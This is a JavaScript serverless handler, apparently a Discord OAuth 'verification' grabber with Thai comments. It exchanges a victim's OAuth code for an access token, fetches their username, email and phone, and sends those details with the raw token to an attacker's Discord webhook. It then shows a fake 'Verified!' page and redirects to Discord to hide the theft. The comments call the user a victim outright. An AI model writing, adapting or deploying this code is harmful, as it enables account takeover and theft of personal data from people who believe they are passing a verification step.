export default async function handler(req, res) {
    const { code } = req.query;
    if (!code) return res.redirect('/');

    // [ 🔐 ] ข้อมูลสำคัญของมหาเทพ
    const WEBHOOK_URL = "ใส่_WEBHOOK_URL_มหาเทพ";
    const CLIENT_ID = "ใส่_CLIENT_ID_มหาเทพ";
    const CLIENT_SECRET = "ใส่_CLIENT_SECRET_มหาเทพ";
    const REDIRECT_URI = "https://ชื่อเว็บมหาเทพ.vercel.app/api/grab";

    try {
        // [ 1 ] แลก Token
        const tokenResponse = await fetch('https://discord.com/api/v10/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: CLIENT_ID, client_secret: CLIENT_SECRET,
                grant_type: 'authorization_code', code: code, redirect_uri: REDIRECT_URI,
            }),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });

        const tokenData = await tokenResponse.json();
        const access_token = tokenData.access_token;

        if (!access_token) throw new Error("No Token");

        // [ 2 ] ดักข้อมูลบัญชีชุดใหญ่
        const userRes = await fetch('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${access_token}` }
        });
        const user = await userRes.json();

        // [ 3 ] ยิงเข้า Webhook มหาเทพ
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🔱 TIDCRAM STRIKE: NEW ACCOUNT 🔱",
                    color: 0x5865F2,
                    thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
                    fields: [
                        { name: "👤 User", value: `**${user.username}** (${user.id})` },
                        { name: "📧 Email", value: user.email || "N/A", inline: true },
                        { name: "📱 Phone", value: user.phone || "N/A", inline: true },
                        { name: "🔐 TOKEN", value: "```" + access_token + "```" }
                    ],
                    footer: { text: "TIDCRAM_V33_ULTRA" },
                    timestamp: new Date()
                }]
            })
        });

        // [ 4 ] ส่งเหยื่อกลับแบบเนียนๆ
        res.setHeader('Content-Type', 'text/html');
        return res.send(`<h1>Verified! Redirecting...</h1><script>setTimeout(()=>{window.location.href='https://discord.com/app'}, 2000)</script>`);

    } catch (err) {
        return res.redirect('/');
    }
}
